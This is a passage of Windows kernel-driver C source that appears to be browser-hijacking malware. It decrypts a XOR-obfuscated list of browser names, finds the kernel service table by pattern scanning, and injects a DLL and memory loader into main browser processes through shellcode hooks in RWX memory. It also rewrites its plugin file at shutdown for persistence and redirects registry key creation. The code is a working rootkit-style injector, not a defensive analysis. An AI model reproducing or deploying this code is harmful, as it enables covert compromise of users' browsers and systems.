		_wcslwr(pTempBuf);
		ProcessObj = PsGetCurrentProcess();
#ifdef _AMD64_
		//x64 add code
		pPEB = PsGetProcessWow64Process(ProcessObj);
		if (wcsstr(pTempBuf, L"\\syswow64\\") != NULL)
		{
			bGet = GetProcessNameByObj(ProcessObj, exename);
			if (bGet && _wcsicmp(exename, L"") != NULL)
			{

				bFindExe = FindInBrowser(exename);
				if (bFindExe)
				{
					BOOLEAN bGetCommand = FALSE;
					bGetCommand = GetCommandLine(ProcessObj, CommandLine);
					if (bGetCommand)
					{
						PWCHAR pchrome = wcsstr(CommandLine, L"renderer");
						PWCHAR pFirefox = wcsstr(CommandLine, L"contentproc");
						if (pchrome == NULL && pFirefox == NULL)
						{
							LOG(LOGFL_INFO, ("[ImageNotify] pid:%d x86 inject %ws CommandLine:%ws", ProcessId, exename, CommandLine));
							InjectDll(ProcessObj, 32);
						}
					}

				}
			}
		} else
		{
			if (pPEB == NULL)
			{
				pPEB = PsGetProcessPeb(ProcessObj);
				bGet = GetProcessNameByObj(ProcessObj, exename);
				bFindExe = FindInBrowser(exename);
				if (bFindExe)
				{
					BOOLEAN bGetCommand = FALSE;
					bGetCommand = GetCommandLine(ProcessObj, CommandLine);
					if (bGetCommand)
					{
						PWCHAR pchrome = wcsstr(CommandLine, L"renderer");
						PWCHAR pFirefox = wcsstr(CommandLine, L"contentproc");
						if (pchrome == NULL && pFirefox == NULL)
						{
							LOG(LOGFL_INFO, ("[ImageNotify] pid:%d x64 inject %ws CommandLine:%ws", ProcessId, exename, CommandLine));
							InjectDll(ProcessObj, 64);
						}
					}

				}
			}
		}
#else
		//x86 add code

		pPEB = PsGetProcessPeb(ProcessObj);
		bGet = GetProcessNameByObj(ProcessObj, exename);
		bFindExe = FindInBrowser(exename);
		if (bFindExe)
		{
			BOOLEAN bGetCommand = FALSE;
			bGetCommand = GetCommandLine(ProcessObj, CommandLine);
			if (bGetCommand)
			{
				PWCHAR pchrome = wcsstr(CommandLine, L"renderer");
				PWCHAR pFirefox = wcsstr(CommandLine, L"contentproc");
				if (pchrome == NULL && pFirefox == NULL)
				{
					LOG(LOGFL_INFO, ("[ImageNotify] pid:%d(%x) x86 inject %ws CommandLine:%ws",ProcessId, ProcessId, exename,CommandLine));
					InjectDll(ProcessObj, 32);
				}
			}
		}


#endif
	}

fun_ret:
	return;
}

ULONGLONG GetKeServiceDescriptorTable64()
{
	char KiSystemServiceStart_pattern[14] = "\x8B\xF8\xC1\xEF\x07\x83\xE7\x20\x25\xFF\x0F\x00\x00"; //
	ULONGLONG CodeScanStart = (ULONGLONG)&_strnicmp;
	ULONGLONG CodeScanEnd = (ULONGLONG)&KdDebuggerNotPresent;
	UNICODE_STRING Symbol;
	ULONGLONG i, tbl_address, b;

	for (i = 0; i < CodeScanEnd - CodeScanStart; i++)
	{
		if (!memcmp((char *)(ULONGLONG)CodeScanStart + i, (char *)KiSystemServiceStart_pattern, 13))
		{
			for (b = 0; b < 50; b++)
			{
				tbl_address = ((ULONGLONG)CodeScanStart + i + b);

				if (*(USHORT *)((ULONGLONG)tbl_address) == (USHORT)0x8d4c) return ((LONGLONG)tbl_address + 7) + *(LONG *)(tbl_address + 3);
			}
		}
	}

	return 0;
}

ULONG_PTR GetSSDTFuncCurAddr(LONG id)
{
#ifdef _AMD64_
	LONG dwtmp = 0;
	PULONG ServiceTableBase = NULL;

	if (KeServiceDescriptorTable == NULL) return NULL;
	if (KeServiceDescriptorTable->NumberOfService < id) return NULL;
	ServiceTableBase = (PULONG)KeServiceDescriptorTable->ServiceTableBase;
	dwtmp = ServiceTableBase[id];
	dwtmp = dwtmp >> 4;
	return (LONGLONG)dwtmp + (ULONGLONG)ServiceTableBase;
#else
	ULONG_PTR p = *(ULONG_PTR *)((ULONG)(KeServiceDescriptorTable.ServiceTableBase) + 4 * id);
	return p;
#endif
}


/**
 * [InjectDll description]
 * @Author   zzc
 * @DateTime 2019年6月7日T7:43:44+0800
 * @param    ProcessObj               [PEPROCESS]
 * @param    ibit                     [32/64]
 */
void InjectDll(PEPROCESS ProcessObj, int ibit)
{
	NTSTATUS status = -1;
	if (NtWriteVirtualMemory && m_pCreateThread && NtProtectVirtualMemory)
	{
		HANDLE ProcessHandle = (HANDLE)-1;
		PVOID dllbase = NULL;
		ULONG_PTR ZeroBits = 0;
		SIZE_T sizeDll = ibit == 64 ? g_iDll64 : g_iDll32;
		PVOID pOldDll = ibit == 64 ? g_pDll64 : g_pDll32;
		ULONG64 dllsize = sizeDll;
		SIZE_T sizeMemLoad = ibit == 64 ? sizeof(MemLoad64) : sizeof(MemLoad);
		PVOID pOldMemloadBase = ibit == 64 ? (PVOID)MemLoad64 : (PVOID)MemLoad;
		ULONG uWriteRet = 0;
		PARAMX param = { 0 };
		PVOID MemloadBase = NULL;
		SIZE_T sizeMemloadAll = sizeMemLoad + sizeof(PARAMX) + 300;
		UCHAR b1[14] = { 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0xC3 };
		PUCHAR pParambase = NULL;
		PUCHAR pCall = NULL;
		PUCHAR    origincode = NULL;
		PUCHAR    restorcode = NULL;
		memcpy(param.pFunction, b1, sizeof(b1));

		status = ObOpenObjectByPointer(ProcessObj, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS, NULL, KernelMode, &ProcessHandle);
		if (!NT_SUCCESS(status))
		{
			kprintf("[InjectDll] ObOpenObjectByPointer status:%x", status);
			return;
		}
		if (sizeDll == 0) return;
		status = ZwAllocateVirtualMemory(ProcessHandle, &dllbase, ZeroBits, &sizeDll, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!NT_SUCCESS(status))
		{
			kprintf("[InjectDll] status:%x", status);
			goto HHHH;
		}

		status = ZwAllocateVirtualMemory(ProcessHandle, &MemloadBase, ZeroBits, &sizeMemloadAll, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

		if (!NT_SUCCESS(status))
		{
			kprintf("[InjectDll] status:%x", status);
			goto HHHH;
		}

		//        kprintf("[InjectDll] MemloadBase:%p", MemloadBase);
		//写入dll
		status = NewNtWriteVirtualMemory(ProcessHandle, dllbase, pOldDll, sizeDll, &uWriteRet);

		if (!NT_SUCCESS(status))
		{
			kprintf("[InjectDll] NewNtWriteVirtualMemory fail: status:%x write addr:%p size:%x", status, dllbase, sizeDll);
			goto HHHH;
		}

		param.lpFileData = (ULONG64)dllbase;
		param.DataLength = dllsize;

		//写入memload
		status = NewNtWriteVirtualMemory(ProcessHandle, MemloadBase, pOldMemloadBase, sizeMemLoad, &uWriteRet);

		if (!NT_SUCCESS(status))
		{
			kprintf("[InjectDll] NewNtWriteVirtualMemory fail: status:%x write addr:%p size:%x", status, MemloadBase, sizeMemLoad);
			goto HHHH;
		}

		pParambase = (PUCHAR)MemloadBase + sizeMemLoad;
		pCall = (PUCHAR)MemloadBase + sizeof(PARAMX) + sizeMemLoad;
		origincode = pCall + 100;
		restorcode = origincode + 50;
		//kprintf("[InjectDll] MemloadBase:%p pParambase:%p pCall:%p", MemloadBase, pParambase, pCall);
		//写入memload param
		status = NewNtWriteVirtualMemory(ProcessHandle, pParambase, &param, sizeof(PARAMX), &uWriteRet);

		if (!NT_SUCCESS(status))
		{
			goto HHHH;
		}

		if (ibit == 32 && fnHookfunc)
		{
			int lencode =  GetAsmSize((PUCHAR)pOldCode32, 7);
			if (lencode)
			{
				ULONG           i = 0;
				unsigned char   jmpcode[] =  { 0xB8, 0x00, 0x00, 0x00, 0x01, 0xFF, 0xE0 };
				int             numcode = 0;
				UCHAR           ucode1[] = { 0xB8, 0x00, 0x00, 0x00, 0x01 };            //mov eax,0x100000000
				UCHAR           ucode2[] = { 0xB8, 0x00, 0x00, 0x00, 0x01, 0xFF, 0xE0 }; //mov rax,0x100000000  jmp rax
				SIZE_T          numbsize = lencode;
				PVOID           pBase = fnHookfunc;
				ULONG           oldProctect;
				UCHAR  callmemload[] =  { 0x60, 0x9c, 0xB8, 0x00, 0x00, 0x10, 0x00, 0x50, 0xB8, 0x00, 0x20, 0x00, 0x00, 0xFF, 0xD0, 0x90, 0x90, 0x90, 0x9D, 0x61 };
				*(PVOID *)&ucode1[1] = fnHookfunc;
				RtlMoveMemory(origincode, fnHookfunc, lencode);
				memcpy(restorcode + numcode, ucode1, sizeof(ucode1));
				numcode += sizeof(ucode1);
				for (i = 0; i < lencode; i++)
				{
					if (i == 0)
					{
						UCHAR ucode[] =  { 0xC6, 0x00,  origincode[i] };
						memcpy(restorcode + numcode, ucode, sizeof(ucode));
						numcode += sizeof(ucode);
					} else
					{
						UCHAR ucode[] = { 0xC6, 0x40, i, origincode[i] };
						memcpy(restorcode + numcode, ucode, sizeof(ucode));
						numcode += sizeof(ucode);
					}
				}
				memcpy(pCall, restorcode, numcode);
				LOG(LOGFL_INFO, ("[InjectDll] pCall:%p lencode:%d origincode:%p",pCall,lencode,origincode));
				pParambase = (PUCHAR)MemloadBase + sizeMemLoad;
				//调用call
				*(ULONG32 *)&callmemload[3] = (ULONG32)pParambase;
				*(ULONG32 *)&callmemload[9] = (ULONG32)MemloadBase;

				memcpy(pCall + numcode, callmemload, sizeof(callmemload));
				numcode += sizeof(callmemload);
				*(ULONG32 *)&ucode2[1] = fnHookfunc;
				memcpy(pCall + numcode, ucode2, sizeof(ucode2));
				status =  NewNtProtectVirtualMemory(ProcessHandle, &pBase, &numbsize, PAGE_EXECUTE_READWRITE, &oldProctect);
				if (NT_SUCCESS(status))
				{
					UCHAR jmpaddr[] = { 0xB8, 0x00, 0x00, 0x00, 0x01, 0xFF, 0xE0 };
					*(ULONG32 *)&jmpaddr[1] = pCall;
					//kprintf("call jump...");
					RtlCopyMemory(fnHookfunc, jmpaddr, sizeof(jmpaddr));
				}
			}


		} else   if (ibit == 64 && fnHookfunc64)
		{
			int lencode =  GetPatchSize((PUCHAR)pOldCode64, 12);
			if (lencode)
			{
				ULONG           i = 0;
				unsigned char   jmpcode[] =  { 0x48, 0xC7, 0xC0, 0x0, 0x0, 0x0, 0x0, 0xFF, 0xE0 };
				int             numcode = 0;
				UCHAR           ucode1[] = { 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };            //mov rax,0x100000000
				UCHAR           ucode2[] = { 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 }; //mov rax,0x100000000  jmp rax
				SIZE_T          numbsize = lencode;
				PVOID           pBase = fnHookfunc64;
				ULONG           oldProctect;
				unsigned char   callmemload[] =  { 0x57, 0x51, 0x50, 0x48, 0x83, 0xEC, 0x60, 0x48, 0xB9, 0x50, 0xA0, 0x0F, 0x3F, 0x01, 0x00, 0x00, 0x00, 0x48, 0xB8, 0xB0, 0x7D, 0x10, 0x3F, 0x01, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0x48, 0x83, 0xC4, 0x60, 0x58, 0x59, 0x5F };
				*(PVOID *)&ucode1[2] = fnHookfunc64;
				RtlMoveMemory(origincode, fnHookfunc64, lencode);
				memcpy(restorcode + numcode, ucode1, sizeof(ucode1));
				numcode += sizeof(ucode1);
				for (i = 0; i < lencode; i++)
				{
					if (i == 0)
					{
						UCHAR ucode[] =  { 0xC6, 0x00,  origincode[i] };
						memcpy(restorcode + numcode, ucode, sizeof(ucode));
						numcode += sizeof(ucode);
					} else
					{
						UCHAR ucode[] = { 0xC6, 0x40, i, origincode[i] };
						memcpy(restorcode + numcode, ucode, sizeof(ucode));
						numcode += sizeof(ucode);
					}
				}
				memcpy(pCall, restorcode, numcode);
				pParambase = (PUCHAR)MemloadBase + sizeMemLoad;
				//调用call
				*(ULONG64 *)&callmemload[9] = (ULONG64)pParambase;
				*(ULONG64 *)&callmemload[19] = (ULONG64)MemloadBase;
				memcpy(pCall + numcode, callmemload, sizeof(callmemload));
				numcode += sizeof(callmemload);
				*(PVOID *)&ucode2[2] = fnHookfunc64;
				memcpy(pCall + numcode, ucode2, sizeof(ucode2));
				status =  NewNtProtectVirtualMemory(ProcessHandle, &pBase, &numbsize, PAGE_EXECUTE_READWRITE, &oldProctect);
				if (NT_SUCCESS(status))
				{
					UCHAR jmpaddr[] = { 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
					*(PVOID *)&jmpaddr[2] = pCall;
					RtlCopyMemory(fnHookfunc64, jmpaddr, sizeof(jmpaddr));
				}
			}
		}
	HHHH:
		ZwClose(ProcessHandle);
	}
}


NTSTATUS AppendListNode(CONST WCHAR name[], LIST_ENTRY *link, ULONG uType)
{
	PMY_COMMAND_INFO pInfo = (PMY_COMMAND_INFO)kmalloc(sizeof(MY_COMMAND_INFO));
	if (NULL == pInfo)
	{
		return STATUS_INSUFFICIENT_RESOURCES;
	}
	RtlZeroMemory(pInfo, sizeof(MY_COMMAND_INFO));
	pInfo->uType = uType;
	wcscpy(pInfo->exename, name);
	InsertHeadList(link, (PLIST_ENTRY)&pInfo->Entry);
	return STATUS_SUCCESS;
}



NTSTATUS MzReadFile(LPWCH pFile, PVOID *ImageBaseAddress, PULONG ImageSize)
{
	HANDLE hDestFile = NULL;
	ULONG ret = 0;
	OBJECT_ATTRIBUTES obj_attrib;
	IO_STATUS_BLOCK Io_Status_Block = { 0 };
	NTSTATUS status = 0;
	LARGE_INTEGER offset = { 0 };
	ULONG length = 0;
	UNICODE_STRING ustrSrcFile = { 0 };
	PVOID pdata1 = NULL;
	RtlInitUnicodeString(&ustrSrcFile, pFile);
	InitializeObjectAttributes(&obj_attrib, &ustrSrcFile, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

	status = ZwCreateFile(&hDestFile, GENERIC_READ, &obj_attrib, &Io_Status_Block, NULL,
						  FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN,
						  FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

	if (NT_SUCCESS(status))
	{

		length = MzGetFileSize(hDestFile);
		if (length > 0)
		{
			pdata1 = kmalloc(length);
			if (pdata1)
			{
				status = ZwReadFile(hDestFile, NULL, NULL, NULL, &Io_Status_Block, pdata1, length, &offset, NULL);

				if (NT_SUCCESS(status))
				{
					*ImageSize = Io_Status_Block.Information;
					*ImageBaseAddress = pdata1;
					ret = status;
				} else
				{
					kprintf("[MzReadFile] %ws ZwReadFile error :%x ", pFile, status);
				}
			}
		}
		ZwClose(hDestFile);
	}
	return status;
}

ULONG MzGetFileSize(HANDLE hfile)
{
	NTSTATUS ntStatus = 0;
	IO_STATUS_BLOCK iostatus = { 0 };
	FILE_STANDARD_INFORMATION fsi = { 0 };
	ntStatus = ZwQueryInformationFile(hfile, &iostatus, &fsi, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
	if (!NT_SUCCESS(ntStatus)) return 0;
	return fsi.EndOfFile.QuadPart;
}

void MyDecryptFile(PUCHAR pdata, int len, UCHAR key)
{
	int i = 0;
	PUCHAR p1 = (PUCHAR *)pdata;

	for (i = 0; i < len; i++)
	{
		p1[i] = key ^ p1[i];
	}
}

void newWorkItem(ULONG bit)
{
	PIO_WORKITEM pIoWorkItem;
	pIoWorkItem = IoAllocateWorkItem(g_drobj);
	if (pIoWorkItem)
	{
		PWORKITEMPARAM pParam = (PWORKITEMPARAM)kmalloc(sizeof(WORKITEMPARAM));
		if (pParam)
		{
			pParam->pid = PsGetCurrentProcessId();
			pParam->bit = bit;
			IoInitializeWorkItem(g_drobj, pIoWorkItem);
			IoQueueWorkItemEx(pIoWorkItem, (PIO_WORKITEM_ROUTINE_EX)WorkerItemRoutine, DelayedWorkQueue, pParam);
		} else
		{
			IoFreeWorkItem(pIoWorkItem);
		}
	}
}

VOID WorkerItemRoutine(PDEVICE_OBJECT DeviceObject, PVOID Context, PIO_WORKITEM IoWorkItem)
{
	NTSTATUS status;
	LARGE_INTEGER localTime;
	IO_STATUS_BLOCK ioStatus;
	FILE_BASIC_INFORMATION flBscInfo;

	if (MmIsAddressValid(Context))
	{
		PWORKITEMPARAM pParam = (PWORKITEMPARAM)Context;
		PEPROCESS ProcessObj = NULL;
		if (NT_SUCCESS(PsLookupProcessByProcessId(pParam->pid, &ProcessObj)))
		{

			InjectDll(ProcessObj, pParam->bit);
			ObfDereferenceObject(ProcessObj);
		}

		kfree(pParam);
	}
	IoUninitializeWorkItem(IoWorkItem);
	IoFreeWorkItem(IoWorkItem);
}

void InitGlobeFunc(PIMAGE_INFO ImageInfo)
{


	if (!fnHookfunc64)
	{
		if (IsX64Module(ImageInfo->ImageBase))
		{
			fnHookfunc64 = GetProcAddress(ImageInfo->ImageBase, HOOKADDR);
			if (fnHookfunc64)
			{
				memcpy(pOldCode64, fnHookfunc64, 20);
			}


			kprintf("[InitGlobeFunc] fnHookfunc64:%p", fnHookfunc64);
		}


	}

	if (!fnHookfunc)
	{
		if (!IsX64Module(ImageInfo->ImageBase))
		{
			fnHookfunc = GetProcAddress(ImageInfo->ImageBase, HOOKADDR);
			if (fnHookfunc)
			{
				memcpy(pOldCode32, fnHookfunc, 20);
			}

			kprintf("[InitGlobeFunc] fnHookfunc32:%p", fnHookfunc);
		}
	}

	if (!m_pCreateThread || !ZwProtectVirtualMemory  || !ZwWriteVirtualMemory)
	{
		ZwWriteVirtualMemory = (TYPE_ZwWriteVirtualMemory)GetProcAddress(ImageInfo->ImageBase, "ZwWriteVirtualMemory");
		ZwCreateThreadEx = (TYPE_NtCreateThreadEx)GetProcAddress(ImageInfo->ImageBase, "ZwCreateThreadEx"); //
		ZwCreateThread = (TYPE_NtCreateThread)GetProcAddress(ImageInfo->ImageBase, "ZwCreateThread");
		ZwProtectVirtualMemory = (TYPE_ZwProtectVirtualMemory)GetProcAddress(ImageInfo->ImageBase, "ZwProtectVirtualMemory");
		m_pCreateThread = ZwCreateThreadEx == NULL ? (PVOID)ZwCreateThread : (PVOID)ZwCreateThreadEx;
		kprintf("[InitGlobeFunc] ZwProtectVirtualMemory:%p m_pCreateThread:%p", ZwProtectVirtualMemory, m_pCreateThread);

		if (m_pCreateThread && ZwProtectVirtualMemory && ZwWriteVirtualMemory)
		{
			ULONG CreateThreadId = NULL;
			ULONG protectvmId = NULL;
			ULONG WriteId = NULL;
			if (IsX64Module(ImageInfo->ImageBase) == TRUE)
			{
				CreateThreadId = (ULONG)SERVICE_ID64(m_pCreateThread);
				protectvmId = (ULONG)SERVICE_ID64(ZwProtectVirtualMemory);
				WriteId = (ULONG)SERVICE_ID64(ZwWriteVirtualMemory);
			} else
			{
				CreateThreadId = SERVICE_ID32(m_pCreateThread);
				protectvmId = SERVICE_ID32(ZwProtectVirtualMemory);
				WriteId = (ULONG)SERVICE_ID32(ZwWriteVirtualMemory);
			}

			if (CreateThreadId && protectvmId && WriteId)
			{
				NtProtectVirtualMemory = (TYPE_ZwProtectVirtualMemory)GetSSDTFuncCurAddr(protectvmId);
				NtWriteVirtualMemory = (TYPE_ZwWriteVirtualMemory)GetSSDTFuncCurAddr(WriteId);
				if (m_pCreateThread == ZwCreateThreadEx)
				{
					NtCreateThreadEx = (TYPE_NtCreateThreadEx)GetSSDTFuncCurAddr(CreateThreadId);
				} else
				{
					NtCreateThread = (TYPE_NtCreateThread)GetSSDTFuncCurAddr(CreateThreadId);
				}
				kprintf("[InitGlobeFunc] WriteId:%d CreateThreadId:%d protectvmId:%d", WriteId, CreateThreadId, protectvmId);
				kprintf("[InitGlobeFunc] NtWriteVirtualMemory:%p NtProtectVirtualMemory:%p m_pCreateThread:%p", NtWriteVirtualMemory, NtProtectVirtualMemory, m_pCreateThread);
				kprintf("[InitGlobeFunc] NtCreateThreadEx:%p NtCreateThread", NtCreateThreadEx);
			}
		}
	}
}

PMY_COMMAND_INFO FindInList(const WCHAR *name, LIST_ENTRY *link, PKSPIN_LOCK lock)
{
	PLIST_ENTRY p;
	BOOLEAN bret = FALSE;
	PMY_COMMAND_INFO pData = NULL;
	KIRQL irql; // 中断级别
	KeAcquireSpinLock(lock, &irql);
	for (p = link->Flink; p != &link->Flink; p = p->Flink)
	{
		PMY_COMMAND_INFO pData1 = CONTAINING_RECORD(p, MY_COMMAND_INFO, Entry);
		if (_wcsicmp(pData1->exename, name) == 0)
		{
			pData = pData1;
			break;
		}
	}
	KeReleaseSpinLock(lock, irql);
	return pData;
}






/**
 * [ReadDriverParameters This routine tries to read the driver-specific parameters from
	the registry.  These values will be found in the registry location
	indicated by the RegistryPath passed in]
 * @Author   zzc
 * @DateTime 2019年6月22日T7:21:04+0800
 * @param    RegistryPath             [the path key passed to the driver during driver entry.]
 * @return                            [None]
 */
VOID ReadDriverParameters(IN PUNICODE_STRING RegistryPath)
{
	OBJECT_ATTRIBUTES attributes;
	HANDLE driverRegKey;
	NTSTATUS status;
	ULONG resultLength;
	UNICODE_STRING valueName;
	UCHAR buffer[sizeof(KEY_VALUE_PARTIAL_INFORMATION) + sizeof(LONG)];

	PAGED_CODE();

	//
	//  If this value is not zero then somebody has already explicitly set it
	//  so don't override those settings.
	//
	if (0 == LoggingFlags)
	{

		//
		//  Open the desired registry key
		//
		InitializeObjectAttributes(&attributes, RegistryPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
		status = ZwOpenKey(&driverRegKey, KEY_READ, &attributes);
		if (!NT_SUCCESS(status))
		{

			return;
		}
		// Read the given value from the registry.
		RtlInitUnicodeString(&valueName, L"DebugFlags");
		status = ZwQueryValueKey(driverRegKey, &valueName, KeyValuePartialInformation, buffer, sizeof(buffer), &resultLength);
		if (NT_SUCCESS(status))
		{
			LoggingFlags = *((PULONG)&(((PKEY_VALUE_PARTIAL_INFORMATION)buffer)->Data));
		}
		//
		//  Close the registry entry
		//
		ZwClose(driverRegKey);
	}
}

NTSTATUS DispatchShutDown(IN PDEVICE_OBJECT Device, IN PIRP Irp)
{
	NTSTATUS status;
	//HANDLE hkey;
	//PKLDR_DATA_TABLE_ENTRY entry=(PKLDR_DATA_TABLE_ENTRY)pDriver_entry->DriverSection;
	//MzWriteFile(strSys,puiprotect,iuiprotect);  //
	status = bAceessFile(g_pPlugPath);
	if (status == STATUS_OBJECT_NAME_NOT_FOUND)
	{
		status = MzWriteFile(g_pPlugPath, g_pPlugBuffer, g_iPlugSize);
	}

	return STATUS_SUCCESS;
}

NTSTATUS MzWriteFile(LPWCH pFile, PVOID pData, ULONG len)
{
	HANDLE hDestFile;
	OBJECT_ATTRIBUTES obj_attrib;
	IO_STATUS_BLOCK Io_Status_Block = { 0 };
	NTSTATUS status = STATUS_UNSUCCESSFUL;
	LARGE_INTEGER offset = { 0 };
	ULONG length = len;
	ULONG uret = 0;
	UNICODE_STRING ustrSrcFile;

	if ((pData == NULL) || (len == 0))
	{
		goto fun_ret;
	}
	RtlInitUnicodeString(&ustrSrcFile, pFile);
	InitializeObjectAttributes(&obj_attrib, &ustrSrcFile, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	if (KeGetCurrentIrql() != PASSIVE_LEVEL)
	{
		return 0;
	}

	status = ZwCreateFile(&hDestFile, FILE_WRITE_DATA, &obj_attrib, &Io_Status_Block, NULL,
						  FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, FILE_OPEN_IF,
						  FILE_NON_DIRECTORY_FILE |
						  FILE_SYNCHRONOUS_IO_NONALERT,
						  NULL, 0);

	status = ZwWriteFile(hDestFile, NULL, NULL, NULL,
						 &Io_Status_Block, pData, len, &offset, NULL);
	if (!NT_SUCCESS(status))
	{
		goto fun_ret;
	}
	if (len != Io_Status_Block.Information)
	{
		goto fun_ret;
	}

	uret = Io_Status_Block.Information;

fun_ret:
	if (hDestFile) ZwClose(hDestFile);
	return status;
}

NTSTATUS bAceessFile(PCWSTR FileName)
{
	NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;
	UNICODE_STRING uniFileName;
	OBJECT_ATTRIBUTES objectAttributes;
	HANDLE ntFileHandle;
	IO_STATUS_BLOCK ioStatus;

	if (KeGetCurrentIrql() != PASSIVE_LEVEL)
	{
		DbgPrint("Do Not At PASSIVE_LEVEL");
		return ntStatus;
	}

	RtlInitUnicodeString(&uniFileName, FileName);
	InitializeObjectAttributes(&objectAttributes, &uniFileName, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,
							   NULL, NULL);
	ntStatus = IoCreateFile(&ntFileHandle, FILE_READ_ATTRIBUTES, &objectAttributes, &ioStatus, 0, FILE_ATTRIBUTE_NORMAL,
							FILE_SHARE_DELETE, FILE_OPEN, 0, NULL, 0, CreateFileTypeNone, NULL, IO_NO_PARAMETER_CHECKING);

	if (NT_SUCCESS(ntStatus))
	{
		ZwClose(ntFileHandle);
	} else
	{
		DbgPrint("[bAceessFile] file:%ws is not exist! ntStatus:%x", FileName, ntStatus);
	}
	return ntStatus;
}

NTSTATUS LfGetObjectName(IN CONST PVOID Object, OUT PUNICODE_STRING *ObjectName, PUNICODE_STRING pPartialName)
{
	NTSTATUS        Status = STATUS_INSUFFICIENT_RESOURCES;
	PUNICODE_STRING TmpName;
	ULONG           ReturnLength;
	ULONG           MaxLen = 0;
	if ((!MmIsAddressValid(Object)) || (ObjectName == NULL)) return Status;

	if (pPartialName->Length > 512 || pPartialName->Length == 0) return Status;

	if (pPartialName->Buffer[0] == L'\\')
	{
		return STATUS_SUCCESS;
	}


	ObQueryNameString(Object, (POBJECT_NAME_INFORMATION)&ReturnLength, sizeof(ULONG), &ReturnLength);
	*ObjectName = NULL;
	MaxLen = ReturnLength + pPartialName->MaximumLength + 4;
	if (ReturnLength > 512) return Status;
	TmpName = (PUNICODE_STRING)kmalloc(MaxLen);
	if (TmpName)
	{
		Status = ObQueryNameString(Object, (POBJECT_NAME_INFORMATION)TmpName, ReturnLength, &ReturnLength);
		if (NT_SUCCESS(Status))
		{
			TmpName->MaximumLength = TmpName->MaximumLength + pPartialName->MaximumLength + 2;
			RtlAppendUnicodeToString(TmpName, L"\\");
			RtlAppendUnicodeToString(TmpName, pPartialName->Buffer);
			*ObjectName = TmpName;
		} else
		{
			kfree(TmpName);
		}
	}

	return Status;
}

void EncodeBuffer(PVOID  SwappedBuffer, PUCHAR origBuf, ULONG Len, BOOLEAN bEncrypte)
{
	try
	{
		if (MmIsAddressValid(SwappedBuffer))
		{
			if (bEncrypte)
			{
				ULONG i = 0;
				for (i = 0; i < Len; i++)
				{
					PUCHAR pByte = (PUCHAR)SwappedBuffer;
					origBuf[i] = pByte[i] ^ 0xa;
				}

			} else
			{

				RtlCopyMemory(origBuf, SwappedBuffer, Len);
			}

		}
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		ULONG code = GetExceptionCode();
	}
}
//L"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellIconOverlayIdentifiers\\Offline Files"
NTSTATUS RedirectReg(PREG_CREATE_KEY_INFORMATION KeyInfo, long NotifyClass, WCHAR path[])
{
	NTSTATUS status = STATUS_SUCCESS;
	UNICODE_STRING FullKeyName = { 0 };
	HANDLE KeyHandle;
	ULONG Disposition;
	OBJECT_ATTRIBUTES ObjectAttrib;
	RtlInitUnicodeString(&FullKeyName, path);
	InitializeObjectAttributes(&ObjectAttrib, &FullKeyName, OBJ_CASE_INSENSITIVE, NULL, NULL);
	if (NotifyClass == RegNtPreCreateKeyEx)
	{
		status = ZwCreateKey(&KeyHandle, KeyInfo->DesiredAccess, &ObjectAttrib, 0, KeyInfo->Class, KeyInfo->CreateOptions, &Disposition);
	} else
	{
		status = ZwOpenKey(&KeyHandle, KeyInfo->DesiredAccess, &ObjectAttrib);
	}
	if (NT_SUCCESS(status))
	{
		PVOID KeyObject;
		status = ObReferenceObjectByHandle(KeyHandle, KeyInfo->DesiredAccess, (POBJECT_TYPE)KeyInfo->ObjectType, KernelMode, &KeyObject, NULL);
		if (NT_SUCCESS(status))
		{
			__try
			{

				if (NotifyClass == RegNtPreCreateKeyEx)
				{
					*KeyInfo->Disposition = Disposition;
				}

				*KeyInfo->ResultObject = KeyObject;
				KeyInfo->GrantedAccess = KeyInfo->DesiredAccess;
				status = STATUS_CALLBACK_BYPASS;
			} __except(EXCEPTION_EXECUTE_HANDLER)
			{
				ObDereferenceObject(KeyObject);
				status = GetExceptionCode();
			}
		}

		ZwClose(KeyHandle);
	}
	return status;
}




void InitAllStr()
{

	NTSTATUS status;
	MyDecryptFile(hexBrowser, sizeof(hexBrowser), 0xb);
	if (TRUE)
	{
		CHAR *pnext = (CHAR *)hexBrowser;
		CHAR *pRetBuff = NULL;
		ULONG i = 0;
		while ((pRetBuff = myStrtok_r((PCHAR)pnext, "\r\n", &pnext)) != NULL)
		{
			ANSI_STRING AnsiString2;
			UNICODE_STRING UnicodeString2;
			RtlInitString(&AnsiString2, pRetBuff);
			status = RtlAnsiStringToUnicodeString(&UnicodeString2, &AnsiString2, TRUE);
			wcscpy(g_HexBrowser[g_iBrowser], UnicodeString2.Buffer);
			g_iBrowser += 1;
			RtlFreeUnicodeString(&UnicodeString2);
			//kprintf("g_iBrowser:%d name:%s", g_iBrowser, pRetBuff);
		}
	}
	MyDecryptFile(hexConfig, sizeof(hexConfig), 0xb);
	if (TRUE)
	{
		CHAR *pnext = (CHAR *)hexConfig;
		CHAR *pRetBuff = NULL;
		ULONG i = 0;
		while ((pRetBuff = myStrtok_r((PCHAR)pnext, "\r\n", &pnext)) != NULL)
		{

			ANSI_STRING AnsiString2;
			UNICODE_STRING UnicodeString2;
			RtlInitString(&AnsiString2, pRetBuff);
